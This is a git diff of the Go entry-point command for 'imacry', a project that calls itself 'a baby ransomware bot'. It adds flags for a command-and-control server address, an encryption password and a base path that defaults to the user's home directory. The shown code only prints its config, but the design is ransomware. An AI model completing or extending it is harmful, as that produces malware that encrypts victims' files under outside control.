@@ -2,22 +2,23 @@ package cmd
 
 import (
 	"fmt"
-	"github.com/spf13/cobra"
 	"os"
 
-	"github.com/spf13/viper"
-)
+	"github.com/apex/log"
+	"github.com/spf13/cobra"
+	"github.com/spf13/pflag"
 
-var cfgFile string
+	"github.com/spf13/viper"
+
+	"github.com/prairir/imacry/pkg/config"
+)
 
 // rootCmd represents the base command when called without any subcommands
 var rootCmd = &cobra.Command{
 	Use:   "imacry",
 	Short: "a baby ransomware bot",
 	Long:  `this is different`,
-	// Uncomment the following line if your bare application
-	// has an action associated with it:
-	// Run: func(cmd *cobra.Command, args []string) { },
+	Run:   RunImacry,
 }
 
 // Execute adds all child commands to the root command and sets flags appropriately.
@@ -29,37 +30,37 @@ func Execute() {
 func init() {
 	cobra.OnInitialize(initConfig)
 
+	pflags := rootCmd.PersistentFlags()
 	// Here you will define your flags and configuration settings.
 	// Cobra supports persistent flags, which, if defined here,
 	// will be global for your application.
+	pflags.StringP("cc-address", "a", "", "command and control server address")
+	viper.BindPFlag("cc-address", pflag.Lookup("cc-address"))
 
-	rootCmd.PersistentFlags().StringVar(&cfgFile, "config", "", "config file (default is $HOME/.imacry.yaml)")
+	pflags.StringP("password", "p", "", "encryption/decryption password.")
+	viper.BindPFlag("password", pflag.Lookup("password"))
 
-	// Cobra also supports local flags, which will only run
-	// when this action is called directly.
-	rootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
+	pflags.StringP("base", "b", "", "base path to start encrypting")
+	viper.BindPFlag("base", pflag.Lookup("base"))
+
 }
 
 // initConfig reads in config file and ENV variables if set.
 func initConfig() {
-	if cfgFile != "" {
-		// Use config file from the flag.
-		viper.SetConfigFile(cfgFile)
-	} else {
-		// Find home directory.
+	// if base is empty, get the home directory
+	if viper.GetString("base") == "" {
 		home, err := os.UserHomeDir()
 		cobra.CheckErr(err)
-
-		// Search config in home directory with name ".imacry" (without extension).
-		viper.AddConfigPath(home)
-		viper.SetConfigType("yaml")
-		viper.SetConfigName(".imacry")
+		viper.Set("base", home)
 	}
 
-	viper.AutomaticEnv() // read in environment variables that match
-
-	// If a config file is found, read it in.
-	if err := viper.ReadInConfig(); err == nil {
-		fmt.Fprintln(os.Stderr, "Using config file:", viper.ConfigFileUsed())
+	err := config.UnmarshalConfig()
+	if err != nil {
+		log.Fatalf("Couldnt unmarshal config: %s", err)
 	}
+}
+
+func RunImacry(cmd *cobra.Command, args []string) {
+	fmt.Println("hello")
+	fmt.Printf("config: %#v\n", config.Config)
 }
